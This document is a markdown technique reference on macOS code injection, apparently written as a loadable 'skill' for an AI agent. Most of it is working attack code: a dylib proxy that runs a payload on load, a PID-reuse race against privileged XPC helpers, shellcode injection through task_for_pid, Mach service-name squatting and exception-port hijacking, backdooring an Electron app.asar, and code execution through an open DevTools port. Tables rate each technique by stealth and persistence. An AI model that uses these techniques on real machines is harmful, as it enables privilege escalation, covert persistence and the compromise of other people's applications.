# Dylib Hijacking & XPC Exploitation — Step-by-Step Techniques

> **AI LOAD INSTRUCTION**: Load this when you need detailed dylib hijacking methodology, XPC exploitation walkthroughs, or Mach port technique specifics. Assumes the main [SKILL.md](./SKILL.md) is already loaded for injection vector overview.

---

## 1. DYLIB HIJACKING METHODOLOGY

### 1.1 Automated Discovery with DyLibHijackScanner

```bash
# Using DYLD_PRINT_RPATHS and DYLD_PRINT_LIBRARIES for analysis
DYLD_PRINT_RPATHS=1 DYLD_PRINT_LIBRARIES=1 /path/to/binary 2>&1 | tee /tmp/dylib_audit.txt

# Parse for missing libraries
grep "not found" /tmp/dylib_audit.txt
```

### 1.2 Manual Weak Dylib Enumeration

```bash
# Step 1: List all load commands
otool -l /path/to/binary > /tmp/loadcmds.txt

# Step 2: Extract weak dylib paths
grep -A 2 LC_LOAD_WEAK_DYLIB /tmp/loadcmds.txt | grep name | awk '{print $2}'

# Step 3: Check which are missing
while read lib; do
  [ ! -f "$lib" ] && echo "HIJACKABLE: $lib"
done < <(grep -A 2 LC_LOAD_WEAK_DYLIB /tmp/loadcmds.txt | grep name | awk '{print $2}')
```

### 1.3 Rpath Analysis

```bash
# Step 1: Enumerate rpath entries (order matters!)
otool -l /path/to/binary | grep -A 2 LC_RPATH | grep path | awk '{print $2}'

# Step 2: Find rpath-relative imports
otool -L /path/to/binary | grep @rpath | awk '{print $1}'

# Step 3: Resolve each @rpath import against rpath entries in order
# First match wins — if earlier rpath dir is writable, you win
```

### 1.4 Complete Dylib Proxy Template

```c
// proxy.c — forwards all symbols to the real dylib while executing payload

#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

// Constructor runs when dylib is loaded
__attribute__((constructor))
static void payload(void) {
    // Avoid running in unintended processes
    const char *proc = getprogname();
    if (strcmp(proc, "target_process") != 0) return;

    // Execute payload
    system("/path/to/payload.sh");
}

// Build with reexport to maintain original functionality:
// gcc -dynamiclib -o hijacked.dylib proxy.c \
//   -Wl,-reexport_library,/path/to/original_real.dylib \
//   -arch x86_64 -arch arm64 \
//   -framework Foundation
```

### 1.5 Signing the Proxy Dylib

```bash
# If target binary has library validation disabled, ad-hoc signing suffices
codesign -s - hijacked.dylib

# If target requires same-team signing, need a valid Developer ID
codesign -s "Developer ID Application: ..." hijacked.dylib

# If target has no library validation at all, no signing needed
```

### 1.6 Dylib Hijacking Priority Matrix

| Hijack Type | Reliability | Stealth | Persistence | Prerequisite |
|---|---|---|---|---|
| Weak dylib (missing) | High | High | Per-launch | Writable target path |
| @rpath (writable prefix) | High | High | Per-launch | Writable rpath dir |
| Proxy (replace existing) | High | Medium | Per-launch | Writable dylib location + re-export |
| DYLD_INSERT_LIBRARIES | High | Low | Per-invocation | Env var entitlement |
| DYLD_LIBRARY_PATH override | Medium | Low | Per-invocation | No Hardened Runtime |

---

## 2. XPC EXPLOITATION WALKTHROUGH

### 2.1 Identifying XPC Services and Their Entitlements

```bash
# List all XPC services in an app bundle
find /Applications/Target.app -name "*.xpc" -type d

# Read the XPC service's Info.plist
plutil -p /Applications/Target.app/Contents/XPCServices/Helper.xpc/Contents/Info.plist

# Check launchd plist for Mach service name
cat /Library/LaunchDaemons/com.target.helper.plist | grep -A 1 MachServices

# Dump XPC service entitlements
codesign -d --entitlements :- /Applications/Target.app/Contents/XPCServices/Helper.xpc/Contents/MacOS/Helper
```

### 2.2 XPC Connection Interception

```objc
// Connecting to a third-party privileged helper
#import <Foundation/Foundation.h>

int main() {
    NSXPCConnection *conn = [[NSXPCConnection alloc]
        initWithMachServiceName:@"com.target.helper"
        options:NSXPCConnectionPrivileged];

    // Set the expected protocol interface
    conn.remoteObjectInterface = [NSXPCInterface
        interfaceWithProtocol:@protocol(HelperProtocol)];

    conn.invalidationHandler = ^{ NSLog(@"Connection invalidated"); };
    conn.interruptionHandler = ^{ NSLog(@"Connection interrupted"); };

    [conn resume];

    // Call methods on the remote object
    [[conn remoteObjectProxyWithErrorHandler:^(NSError *err) {
        NSLog(@"Error: %@", err);
    }] performPrivilegedAction:@"payload"];

    [[NSRunLoop currentRunLoop] run];
    return 0;
}
```

### 2.3 PID Reuse Attack Implementation

```c
// pid_reuse.c — race condition exploit for PID-validated XPC
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <spawn.h>
#include <signal.h>

extern char **environ;

int main(int argc, char *argv[]) {
    pid_t target_pid = atoi(argv[1]);  // PID we want to impersonate

    // Fork rapidly to try to get the target PID
    for (int i = 0; i < 100000; i++) {
        pid_t child = fork();
        if (child == 0) {
            if (getpid() == target_pid) {
                // We got the target PID! Send XPC message now.
                execl("/path/to/xpc_client", "xpc_client", NULL);
            }
            _exit(0);
        }
        waitpid(child, NULL, 0);
    }
    return 0;
}
```

### 2.4 Audit Token Extraction

```objc
// Properly extracting audit token from XPC connection (for defenders/auditors)
- (BOOL)listener:(NSXPCListener *)listener
    shouldAcceptNewConnection:(NSXPCConnection *)conn {

    audit_token_t token = conn.auditToken;  // macOS 13+
    // Or via private API:
    // [conn valueForKey:@"auditToken"];

    // Verify code signature using audit token (SECURE)
    SecCodeRef code = NULL;
    NSDictionary *attrs = @{
        (__bridge NSString *)kSecGuestAttributeAudit: [NSData dataWithBytes:&token length:sizeof(token)]
    };
    SecCodeCopyGuestWithAttributes(NULL, (__bridge CFDictionaryRef)attrs, kSecCSDefaultFlags, &code);

    // Check requirement
    SecRequirementRef req = NULL;
    SecRequirementCreateWithString(
        CFSTR("identifier \"com.legit.client\" and anchor apple generic"),
        kSecCSDefaultFlags, &req);

    OSStatus status = SecCodeCheckValidity(code, kSecCSDefaultFlags, req);
    return (status == errSecSuccess);
}
```

---

## 3. MACH PORT TECHNIQUES

### 3.1 task_for_pid Memory Injection

```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

kern_return_t inject_shellcode(pid_t target_pid, void *shellcode, size_t size) {
    mach_port_t task;
    kern_return_t kr;

    // Get task port (requires root + non-SIP target)
    kr = task_for_pid(mach_task_self(), target_pid, &task);
    if (kr != KERN_SUCCESS) return kr;

    // Allocate memory in target
    mach_vm_address_t remote_addr = 0;
    kr = mach_vm_allocate(task, &remote_addr, size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) return kr;

    // Write shellcode
    kr = mach_vm_write(task, remote_addr, (vm_offset_t)shellcode, size);
    if (kr != KERN_SUCCESS) return kr;

    // Set executable permissions
    kr = mach_vm_protect(task, remote_addr, size, FALSE,
                         VM_PROT_READ | VM_PROT_EXECUTE);
    if (kr != KERN_SUCCESS) return kr;

    // Create remote thread
    x86_thread_state64_t state;
    memset(&state, 0, sizeof(state));
    state.__rip = remote_addr;

    thread_act_t thread;
    kr = thread_create_running(task, x86_THREAD_STATE64,
                               (thread_state_t)&state,
                               x86_THREAD_STATE64_COUNT, &thread);
    return kr;
}
```

### 3.2 Bootstrap Server Name Squatting

```c
#include <servers/bootstrap.h>
#include <mach/mach.h>

// Register a Mach service name before the legitimate service does
kern_return_t squat_service(const char *service_name) {
    mach_port_t bp, service_port;

    task_get_bootstrap_port(mach_task_self(), &bp);

    kern_return_t kr = bootstrap_check_in(bp, service_name, &service_port);
    if (kr == KERN_SUCCESS) {
        printf("[+] Squatted service: %s\n", service_name);
        // Now receive messages intended for the real service
        // Can inspect, modify, and forward them (MITM)
    }
    return kr;
}
```

### 3.3 Exception Port Hijacking

```c
#include <mach/mach.h>

// Set exception port on target to intercept crashes
kern_return_t hijack_exceptions(mach_port_t task) {
    mach_port_t exc_port;

    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exc_port);
    mach_port_insert_right(mach_task_self(), exc_port, exc_port,
                           MACH_MSG_TYPE_MAKE_SEND);

    // Intercept all exceptions
    kern_return_t kr = task_set_exception_ports(task,
        EXC_MASK_ALL,
        exc_port,
        EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,
        THREAD_STATE_NONE);

    // Now wait for exception messages
    // Can redirect execution by modifying thread state before replying
    return kr;
}
```

---

## 4. ELECTRON-SPECIFIC DEEP DIVE

### 4.1 Identifying Electron Apps

```bash
# Quick check for Electron framework
find /Applications -path "*/Electron Framework.framework" -maxdepth 5 2>/dev/null

# Or check for Electron-specific files
find /Applications -name "electron.asar" -o -name "app.asar" 2>/dev/null

# Get Electron version
strings "/Applications/Target.app/Contents/Frameworks/Electron Framework.framework/Electron Framework" | grep "Chrome/" | head -1
```

### 4.2 Extracting and Patching app.asar

```bash
# Install asar tool
npm install -g @electron/asar

# Extract app code
asar extract "/Applications/Target.app/Contents/Resources/app.asar" /tmp/app_extracted

# Modify main entry point (usually main.js or index.js)
# Add payload at top of entry script
echo 'require("child_process").execSync("id > /tmp/pwned");' > /tmp/payload.js
cat /tmp/payload.js /tmp/app_extracted/main.js > /tmp/app_extracted/main_patched.js
mv /tmp/app_extracted/main_patched.js /tmp/app_extracted/main.js

# Repack (only works if OnlyLoadAppFromAsar fuse is off)
asar pack /tmp/app_extracted "/Applications/Target.app/Contents/Resources/app.asar"
```

### 4.3 Chrome DevTools Protocol Exploitation

```python
import websocket
import json
import requests

# When --inspect port is open
debug_url = requests.get("http://127.0.0.1:9229/json").json()[0]["webSocketDebuggerUrl"]
ws = websocket.create_connection(debug_url)

# Execute arbitrary code in the Electron main process
ws.send(json.dumps({
    "id": 1,
    "method": "Runtime.evaluate",
    "params": {
        "expression": "require('child_process').execSync('id').toString()"
    }
}))

result = json.loads(ws.recv())
print(result["result"]["result"]["value"])
```

---

## 5. INJECTION TECHNIQUE COMPARISON MATRIX

| Technique | Root Required | SIP Bypass Needed | Survives Reboot | TCC Inheritance | Stealth |
|---|---|---|---|---|---|
| DYLD_INSERT_LIBRARIES | No | No (if entitled) | No | Yes | Low |
| Weak dylib hijack | No | No | Yes (per-launch) | Yes | High |
| @rpath hijack | No | No | Yes (per-launch) | Yes | High |
| Dylib proxy | No | No | Yes (per-launch) | Yes | Medium |
| XPC exploitation | No | No | Per-connection | Varies | Medium |
| task_for_pid | Yes | Yes (for Apple bins) | No | No | Low |
| ELECTRON_RUN_AS_NODE | No | No | No | Yes | Low |
| Electron asar patch | No | No | Yes | Yes | Medium |
| osascript | No | No | No | Automation only | Low |
